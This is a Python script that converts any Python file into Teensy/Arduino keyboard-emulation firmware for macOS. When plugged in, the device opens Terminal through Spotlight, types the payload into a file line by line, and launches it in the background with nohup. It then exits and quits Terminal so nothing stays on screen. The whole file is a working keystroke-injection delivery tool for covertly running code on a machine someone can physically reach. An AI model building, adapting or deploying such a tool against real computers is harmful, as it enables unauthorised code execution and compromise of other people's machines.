#!/usr/bin/python3

'''
Ok so..... a few finicky things about this, and I'm too tired right now to fix
Make sure in your target python file that you want to be your payload:
    - You only use double quotes (single quotes of any form really screws it up)
    - Make your strings, even long ones, a single line
    - You should survive :)

'''



import sys

payload_name = 'payload.py'

preamble = '''
int ds = 500;

void setup(){
    delay(1000);
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, HIGH);
    openapp("Terminal");
    delay(7000);
    typeln("cd");
    typeln("rm ''' + payload_name + '''");
    typeln("touch ''' + payload_name + '''");
'''

suffix = '''
    typeln("nohup python3 ''' + payload_name + ''' &");
    delay(50);
    typeln("exit");
    delay(50);
    cmd(KEY_Q);
    delay(50);
    typeln("");
    delay(50);

}

void typeln(String chars)
{
  Keyboard.println(chars);

}

// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}


void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_BUILTIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_BUILTIN, LOW);
  delay(ds/2);
}
'''

def main(file_in, delay, file_out):

    with open(file_in, 'r') as f:
        lines = f.readlines()



    with open(file_out, 'w') as fout:
        print(preamble, file=fout)

        for line in lines:
            # line = line.replace('\t', '\\\\t')
            # line = line.replace('    ', '\\\\t')
            line = line.replace('"', '\\"')

            line = line.strip('\n')
            line = line.replace('\\n', '\\\\\\\\n')

            print('\ttypeln("echo \'' + line + '\' >> ' + payload_name + '");', file=fout)
            print('\tdelay(' + delay + ');', file=fout)

        print(suffix, file=fout)



if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("ERROR: Usage <file to convert> <delay in seconds> <file out>")
        sys.exit(1)

    try:
        delay = int(sys.argv[2])
        delay = str(delay)
    except ValueError:
        print("ERROR delay not in seconds: Usage <file to convert> <delay in seconds> <file out>")
        sys.exit(1)

    file_in = sys.argv[1]
    file_out = sys.argv[3]

    main(file_in, delay, file_out)
